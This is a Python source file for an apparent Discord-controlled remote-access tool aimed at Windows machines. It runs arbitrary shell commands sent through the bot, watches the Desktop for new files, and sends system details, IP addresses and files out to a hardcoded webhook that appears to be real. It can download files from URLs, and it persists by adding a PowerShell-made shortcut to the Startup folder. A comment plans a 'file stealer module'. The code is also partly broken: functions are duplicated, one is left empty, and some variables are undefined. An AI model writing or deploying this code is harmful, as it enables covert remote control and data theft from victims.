import os
import subprocess
import psutil
import socket
import time
import logging
import requests
import pystray
import threading
from PIL import Image
import socket
import platform
from discord_webhook import DiscordWebhook
import logging
from file_monitor_bot import FileMonitorBot
from file_monitor_utils import FileMonitor, NotificationHandler

# Initialize FileMonitor and NotificationHandler
#classes start here

class FileMonitor:
    def __init__(self, directory_path):
        self.directory_path = directory_path
        self.last_scan_time = time.time()

    def get_files(self):
        files = []
        for root, _, filenames in os.walk(self.directory_path):
            for filename in filenames:
                files.append(os.path.join(root, filename))
        return files

    def has_changes(self):
        current_scan_time = time.time()
        if current_scan_time - self.last_scan_time >= 10:  # Example: Check for changes every 10 seconds
            self.last_scan_time = current_scan_time
            return True
        return False

class DiscordCommandProcessor:
    def __init__(self, webhook_url, monitor):
        self.webhook_url = webhook_url
        self.monitor = monitor

    def execute_command(self, command):
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
            return result.strip()
        except subprocess.CalledProcessError as e:
            return f"Error: {e.output.strip()}"

    def process_discord_commands(self, command):
        if command.lower() == "bot/pcmd":
            command_to_execute = input("Enter the command to execute: ")
            result = self.execute_command(command_to_execute)
            self.send_to_discord(result)
        elif command.lower() == "bot/completescan":
            if monitor.has_changes():
                files = monitor.get_files()
                self.send_to_discord(f"Changes detected: {', '.join(files)}")
            else:
                self.send_to_discord("No changes detected.")
        else:
            self.send_to_discord("Invalid command. Please try again.")

    def send_to_discord(self, message):
        try:
            webhook = DiscordWebhook(url=self.webhook_url, content=message)
            webhook.execute()
        except Exception as e:
            print(f"Error sending message to Discord: {str(e)}")
 
#classes end here

def create_file(file_path, content=""):
    try:
        with open(file_path, 'w') as file:
            file.write(content)
        return f"File created: {file_path}"
    except Exception as e:
        return f"Error creating file: {str(e)}"

def send_file_to_discord(file_path, webhook_url, message=""):
    try:
        webhook = DiscordWebhook(url=webhook_url, content=message)
        with open(file_path, "rb") as file:
            webhook.add_file(file.read(), filename=os.path.basename(file_path))
        webhook.execute()
        return f"File sent to Discord: {file_path}"
    except Exception as e:
        return f"Error sending file to Discord: {str(e)}"

def execute_command(command):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        return result.strip()
    except subprocess.CalledProcessError as e:
        return f"Error: {e.output.strip()}"

def log_command_execution(command, result):
    log_message = f"Command executed: {command}\nResult: {result}"
    logging.info(log_message)

def download_and_install_file(file_url, save_path=os.getcwd()):
    try:
        response = requests.get(file_url, stream=True)
        file_name = os.path.basename(file_url)
        file_path = os.path.join(save_path, file_name)
        
        with open(file_path, "wb") as file:
            for chunk in response.iter_content(chunk_size=8192):
                file.write(chunk)
                
        return f"Downloaded and saved file: {file_path}"
    except Exception as e:
        return f"Error downloading file: {str(e)}"
    
def remove_from_startup():
    startup_shortcut_path = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup", "Your_Script_Shortcut.lnk")
    if os.path.exists(startup_shortcut_path):
        os.remove(startup_shortcut_path)

def create_termination_button():
    termination_image_path = "close_icon.png"  # Path to the termination button image
    # Logic to display the termination button using a GUI library (e.g., tkinter)

def get_system_info():
    """Get detailed system information."""
    system_info = [
        f"System: {platform.system()} {platform.version()}",
        f"Processor: {platform.processor()}",
        f"Machine: {platform.machine()}",
        f"RAM: {psutil.virtual_memory().total / (1024 ** 3):.2f} GB"
    ]
    
    disk_partitions = psutil.disk_partitions()
    for partition in disk_partitions:
        partition_info = psutil.disk_usage(partition.mountpoint)
        system_info.append(f"Disk {partition.device}: Total {partition_info.total / (1024 ** 3):.2f} GB, Free {partition_info.free / (1024 ** 3):.2f} GB")

    network_interfaces = psutil.net_if_addrs()
    for interface, addresses in network_interfaces.items():
        for address in addresses:
            if address.family == socket.AF_INET:
                system_info.append(f"Network Interface {interface}: IPv4 Address {address.address}")

    return system_info

def send_system_info_to_discord():
    system_info = get_system_info()
    try:
        data = {'content': '\n'.join(system_info)}
        response = requests.post('YOUR_DISCORD_WEBHOOK_URL', json=data)
        response.raise_for_status()
        return "System information sent to Discord successfully!"
    except Exception as e:
        return f"Failed to send system information to Discord - {str(e)}"


def setup_logging(log_file_path):
    """Setup logging to a file."""
    logging.basicConfig(filename=log_file_path, level=logging.INFO,
                        format='%(asctime)s - %(levelname)s - %(message)s')
 
def log(message):
    """Log a message with a timestamp to both the console and the log file."""
    current_time = time.strftime('%Y-%m-%d %H:%M:%S')
    formatted_message = f"[{current_time}] {message}"
    print(formatted_message)
    logging.info(formatted_message)

def send_error_to_discord(error_message):
    """Send an error message to Discord."""
    try:
        data = {'content': error_message}
        response = requests.post(DISCORD_WEBHOOK_URL, json=data)
        response.raise_for_status()
        log(f"Error message sent to Discord: {error_message}")
    except Exception as e:
        log(f"Failed to send error message to Discord - {str(e)}")

def start_bot():
    bot = FileMonitorBot(command_prefix=DISCORD_BOT_COMMAND_PREFIX, discord_token=DISCORD_BOT_TOKEN,
                         discord_webhook_url=DISCORD_WEBHOOK_URL,
                         desktop_monitor_path=DESKTOP_MONITOR_PATH,
                         creator_directory=CREATOR_DIRECTORY)
    bot.run_bot()
# Call the below function to start monitoring and bot in separate threads
# start_monitoring_and_bot()  # Uncomment this line to start monitoring and bot threads

def start_monitoring_and_bot():
    bot_thread = threading.Thread(target=start_bot, daemon=True)
    bot_thread.start()

    while True:
        monitor_changes()
        received_command = input("Enter Discord command: ")
        process_discord_commands(received_command)
def on_quit_callback(icon, item, notification_handler):
    icon.stop()
    remove_from_startup()
    notification_handler.send_discord_message(f"Bot terminated at {get_current_time()}.")

def remove_from_startup():
    startup_shortcut_path = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup", "Your_Script_Shortcut.lnk")
    if os.path.exists(startup_shortcut_path):
        os.remove(startup_shortcut_path)

def create_system_tray_icon(notification_handler):
    image = Image.open("close icon.png")  # Provide the path to your termination icon
    menu = pystray.Menu(pystray.MenuItem('Quit', lambda _: on_quit_callback(_, notification_handler)))
    icon = pystray.Icon("name", image, "Title", menu)
    icon.run()


def get_current_time():
    return time.strftime("%Y-%m-%d %H:%M:%S")

def send_system_info_to_discord():
    host_ip = socket.gethostbyname(socket.gethostname())
    system_info = [
        f"System: {platform.system()} {platform.version()}",
        f"Processor: {platform.processor()}",
        f"Machine: {platform.machine()}",
        f"RAM: {psutil.virtual_memory().total / (1024 ** 3):.2f} GB",
        f"Host IP Address: {host_ip}"
    ]
    try:
        data = {'content': '\n'.join(system_info)}
        response = requests.post(DISCORD_WEBHOOK_URL, json=data)
        response.raise_for_status()
        notification_handler.send_discord_message("System information sent to Discord successfully!")
    except Exception as e:
        notification_handler.send_error_notification(f"Failed to send system information to Discord - {str(e)}")
def download_and_install_file(file_url):
    try:
        response = requests.get(file_url, stream=True)
        file_name = os.path.basename(file_url)
        download_path = os.path.join(os.getcwd(), file_name)  # Save the file in the current directory
        with open(download_path, "wb") as file:
            for chunk in response.iter_content(chunk_size=8192):
                file.write(chunk)
        return download_path
    except Exception as e:
        return str(e)

def send_file_to_discord(file_path, message=""):
    try:
        with open(file_path, 'rb') as file_content:
            data = {'content': message}
            files = {'file': (os.path.basename(file_path), file_content)}
            response = requests.post(DISCORD_WEBHOOK_URL, data=data, files=files)
            response.raise_for_status()
            return "File sent to Discord successfully!"
    except Exception as e:
        return f"Failed to send file to Discord - {str(e)}"

def send_message_to_discord(message):
    try:
        data = {'content': message}
        response = requests.post(DISCORD_WEBHOOK_URL, data=data)
        response.raise_for_status()
        return "Message sent to Discord successfully!"
    except Exception as e:
        return f"Failed to send message to Discord - {str(e)}"

def execute_command(command):
    try:
        subprocess.run(command, shell=True, check=True)
        return "Command executed successfully!"
    except Exception as e:
        return f"Error executing command - {str(e)}"

def monitor_changes(desktop_monitor):
    try:
        desktop_monitor.monitor_for_duration(duration=10)  # Monitor for changes every 10 seconds
        added_files = desktop_monitor.get_added_files()
        for file_path in added_files:
            notification_handler.send_discord_message(f"New file added: {file_path}")
        # Send periodic info to Discord (example: every 30 minutes)
        if time.time() % (30 * 60) < 1:
            notification_handler.send_discord_message("Periodic info message.")
    except Exception as e:
        error_message = f"Error occurred: {str(e)}"
        notification_handler.send_error_notification(error_message)

def process_discord_commands(command):
    if command.lower().startswith("bot/pcmd"):
        # Extract the command from the message
        command_to_execute = command[len("bot/pcmd "):]
        try:
            subprocess.run(command_to_execute, shell=True, check=True)
            notification_handler.send_discord_message(f"Executed command: {command_to_execute}")
        except Exception as e:
            notification_handler.send_error_notification(f"Error executing command: {str(e)}")
    elif command.lower() == "bot/completescan":
        # Implement complete scan logic and file stealer module if required
        pass  # Implement your logic here
    elif command.lower() == "bot/install":
        # Implement file download and installation logic
        pass  # Implement your logic here
    else:
        notification_handler.send_discord_message("Invalid command. Please try again.")

def start_monitoring_and_commands():
    while True:
        monitor_changes()  # Monitor file changes
        # Simulate receiving a Discord command (replace this with your Discord bot logic)
        received_command = input("Enter Discord command: ")
        process_discord_commands(received_command)
def check_first_time_activation():
    if not os.path.exists(FLAG_FILE_PATH):
        with open(FLAG_FILE_PATH, "w") as flag_file:
            flag_file.write("This flag file indicates that the script should run forever.")
        add_to_startup()

def add_to_startup():
    startup_shortcut_path = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup", "Your_Script_Shortcut.lnk")
    if not os.path.exists(startup_shortcut_path):
        powershell_command = f"""
            $targetPath = "{os.path.abspath(__file__)}"
            $shortcutPath = "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Your_Script_Shortcut.lnk"
            $WScriptShell = New-Object -ComObject WScript.Shell
            $Shortcut = $WScriptShell.CreateShortcut($shortcutPath)
            $Shortcut.TargetPath = $targetPath
            $Shortcut.Save()
            """
        subprocess.run(["powershell", "-Command", powershell_command])

# Call this function at the beginning of your script
def setup():
    check_first_time_activation()

def initialize():
    global DISCORD_WEBHOOK_URL, DISCORD_BOT_TOKEN, CLOSE_ICON_PATH, DIRECTORY_TO_MONITOR, SCRIPT_SHORTCUT_NAME, FLAG_FILE_PATH
    global FILE_MONITOR_BOT, FILE_MONITOR, notification_handler
    global desktop_monitor,monitor,discord_command_processor,DISCORD_BOT_COMMAND_PREFIX,CREATOR_DIRECTORY ,DESKTOP_MONITOR_PATH
    desktop_monitor = FileMonitor(os.path.join(os.path.join(os.environ["USERPROFILE"]), "Desktop"))
    """CREATOR_DIRECTORY: This variable represents the directory path where the creator of the bot intends to store or manage certain files or resources. For example, if the bot creates log files, temporary files, or stores downloaded content, it might place them in this directory. The value "/path/to/your/directory" is a placeholder, indicating that the specific directory path should be provided by the user of the script. Users need to replace "/path/to/your/directory" with the actual directory path where they want the bot to manage files.

    DISCORD_BOT_COMMAND_PREFIX: This variable represents the character or string that precedes bot commands in Discord messages. For instance, if the bot is programmed to respond to messages starting with !, then DISCORD_BOT_COMMAND_PREFIX is set to '!'. If the bot is configured to respond to messages starting with a different character or string (such as '.' or '/'), this variable holds that specific prefix."""
    CREATOR_DIRECTORY = "/path/to/your/directory"
    DISCORD_BOT_COMMAND_PREFIX = '!'
    DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1167795441220460574/uIb8VBmgbM41RcWNe2yFowlrkm_n5yIFavDkN9L5ka5KbWNBwey6_AxCSkSWxRXyfmGU"
    DISCORD_BOT_TOKEN = 'YOUR_DISCORD_BOT_TOKEN'
    CLOSE_ICON_PATH = 'path/to/close_icon.png'
    DIRECTORY_TO_MONITOR = 'path/to/your/directory'
    SCRIPT_SHORTCUT_NAME = 'Your_Script_Shortcut.lnk'
    FLAG_FILE_PATH = 'path/to/run_forever_flag.txt'

    DESKTOP_MONITOR_PATH = os.path.join(os.path.join(os.environ["USERPROFILE"]), "Desktop")

    FILE_MONITOR_BOT = FileMonitorBot(command_prefix='!', discord_token=DISCORD_BOT_TOKEN,
                                      discord_webhook_url=DISCORD_WEBHOOK_URL,
                                      desktop_monitor_path=os.path.join(os.path.join(os.environ["USERPROFILE"]), "Desktop"),
                                      creator_directory="/path/to/your/directory")
    FILE_MONITOR = FileMonitor(DIRECTORY_TO_MONITOR)
    notification_handler = NotificationHandler(DISCORD_WEBHOOK_URL)
    monitor = FileMonitor(os.path.join(os.path.join(os.environ["USERPROFILE"]), "Desktop"))
    discord_command_processor = DiscordCommandProcessor('YOUR_DISCORD_WEBHOOK_URL', monitor)

def get_current_time():
    return time.strftime("%Y-%m-%d %H:%M:%S")

def FMS():



def main():
    initialize()  # Initialize global variables and classes
    log_file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'log.txt')
    setup_logging(log_file_path)

    try:
        setup()  # Call the setup function to perform necessary setup tasks
        create_system_tray_icon(notification_handler)  # Pass notification_handler instance to the system tray function
        start_monitoring_and_commands(desktop_monitor)  # Pass desktop_monitor instance to the monitoring function
    except Exception as e:
        error_message = f"Fatal Error occurred: {str(e)}"
        log(error_message)
        send_error_to_discord(error_message)



if __name__ == "__main__":
    main()
